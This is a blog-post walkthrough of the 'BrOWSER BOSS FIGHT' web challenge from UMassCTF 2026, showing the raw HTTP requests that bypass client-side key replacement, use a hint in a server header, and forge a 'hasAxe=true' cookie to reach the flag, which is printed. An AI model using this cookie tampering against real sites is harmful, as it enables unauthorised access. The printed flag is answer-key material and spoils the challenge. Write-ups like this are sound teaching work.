---
layout: post
title:  "BrOWSER BOSS FIGHT"
date:   2026-04-13 18:52:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /UMassCTF-2026-browser-boss-fight/
---

**Category**: web easy

**Author**: Ian/ianstadtlander

**Description**: This familiar brick castle is hiding something... can you break in and defeat the Koopa King? [http://browser-boss-fight.web.ctf.umasscybersec.org:48003](http://browser-boss-fight.web.ctf.umasscybersec.org:48003)

I go to `http://browser-boss-fight.web.ctf.umasscybersec.org:48003/`:

![Alt text](/images/umassweb3.png)

On `view-source:http://browser-boss-fight.web.ctf.umasscybersec.org:48003/`:
```html
<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="/css/style.css">
  </head>
  <body class="welcome_body">
    <form action="/password-attempt" method="post" , class="key-input-form" id="key-form">
      <button type="submit" class="door-btn">
        <img src="/images/door.png" class="door-img">
      </button>
      <input type="text" id="key" name="key" placeholder="Input Key" required onkeydown="return event.key != 'Enter';">
      <script>
        document.getElementById('key-form').onsubmit = function() {
            const knockOnDoor = document.getElementById('key'); // It replaces whatever they typed with 'WEAK_NON_KOOPA_KNOCK' knockOnDoor.value = "WEAK_NON_KOOPA_KNOCK"; return true; }; 
      </script>
    </form>
  </body>
</html>
```
You can submit a key (a POST request to `/password-attempt`) but it always gets replaced with `WEAK_NON_KOOPA_KNOCK`.

In burpsuite I send this:
```http
POST /password-attempt HTTP/1.1
Host: browser-boss-fight.web.ctf.umasscybersec.org:48003
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://browser-boss-fight.web.ctf.umasscybersec.org:48003/
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://browser-boss-fight.web.ctf.umasscybersec.org:48003
DNT: 1
Connection: keep-alive
Cookie: connect.sid=s%3AGCl7fF3LbtFAZlvjDiP44RIe4I25ml8c.bXAytcRi8kixrE3hRv0eESSVTXv5dHorwPaB27PqOlc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

key=test
```

Response:
```http
HTTP/1.1 302 Found
X-Powered-By: Express
Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")
Location: /kamek.html
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 40
Date: Fri, 10 Apr 2026 22:38:22 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<p>Found. Redirecting to /kamek.html</p>
```

So I check `under_the_doormat`:
```http
POST /password-attempt HTTP/1.1
Host: browser-boss-fight.web.ctf.umasscybersec.org:48003
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://browser-boss-fight.web.ctf.umasscybersec.org:48003/
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://browser-boss-fight.web.ctf.umasscybersec.org:48003
DNT: 1
Connection: keep-alive
Cookie: connect.sid=s%3AGCl7fF3LbtFAZlvjDiP44RIe4I25ml8c.bXAytcRi8kixrE3hRv0eESSVTXv5dHorwPaB27PqOlc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

key=under_the_doormat
```

And I get redirected to a new page:
```http
HTTP/1.1 302 Found
X-Powered-By: Express
Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")
Location: /bowsers_castle.html
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 49
Date: Fri, 10 Apr 2026 22:39:07 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<p>Found. Redirecting to /bowsers_castle.html</p>
```

In the response to `GET /bowsers_castle.html`, 150 different cookies are set:
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")
Set-Cookie: goomba_guard_1=fe83ep; Path=/
Set-Cookie: koopa_guard_1=1mm1h5; Path=/
Set-Cookie: mushroom_huffing_italian_1=93jzuj; Path=/
Set-Cookie: dry_bones_1=202z55; Path=/
Set-Cookie: fruit_named_woman_1=fiv2a; Path=/
Set-Cookie: goomba_guard_2=7g37r; Path=/
Set-Cookie: koopa_guard_2=ddrs6p; Path=/
...etc
Set-Cookie: goomba_guard_29=qhw9zc; Path=/
Set-Cookie: koopa_guard_29=iiizc8; Path=/
Set-Cookie: mushroom_huffing_italian_29=1is7si; Path=/
Set-Cookie: dry_bones_29=tmy52l; Path=/
Set-Cookie: fruit_named_woman_29=494jz2; Path=/
Set-Cookie: goomba_guard_30=dpd6s3; Path=/
Set-Cookie: koopa_guard_30=pz9syu; Path=/
Set-Cookie: mushroom_huffing_italian_30=rjqam6; Path=/
Set-Cookie: dry_bones_30=a2d9l8; Path=/
Set-Cookie: fruit_named_woman_30=2fk671; Path=/
Set-Cookie: hasAxe=false; Path=/
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 10 Apr 2026 22:09:20 GMT
ETag: W/"115-19d79714680"
Content-Type: text/html; charset=UTF-8
Content-Length: 277
Date: Fri, 10 Apr 2026 22:40:58 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="../css/style.css">
</head>
<body class="bowsers-castle-body" id="castle-backdrop">
    <p class="bowser-speech">I don't know how you got in, but you can't possibly defeat me! I removed the axe!</p> 
</body>
</html>
```

I notice the message says `I removed the axe!` and there is a cookie called `hasAxe` set to `false` I make a request with this set to `true`:
```shell
curl -i -H "Cookie: connect.sid=s%3AY4sxK75p9yCTfoSYZrUhHUntQiUmf6ao.ljScBbX6ZS1OJc8UT%2FQ8lhPkQJATzUpEP7fYW2KF2Zw; hasAxe=true" http://browser-boss-fight.web.ctf.umasscybersec.org:48003/bowsers_castle.html  
HTTP/1.1 200 OK  
X-Powered-By: Express  
Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")  
Accept-Ranges: bytes  
Cache-Control: public, max-age=0  
Last-Modified: Fri, 10 Apr 2026 22:09:20 GMT  
ETag: W/"c7-19d79714680"  
Content-Type: text/html; charset=UTF-8  
Content-Length: 199  
Date: Fri, 10 Apr 2026 22:46:35 GMT  
Connection: keep-alive  
Keep-Alive: timeout=5  
  
<!DOCTYPE html>  
<html>  
<head>  
<link rel="stylesheet" href="../css/style.css">  
</head>  
<body class="victory-body">  
<p class="victory-text">UMASS{br0k3n_1n_2_b0wz3r5_c4st13}</p>  
</body>  
</html>
```

`UMASS{br0k3n_1n_2_b0wz3r5_c4st13}`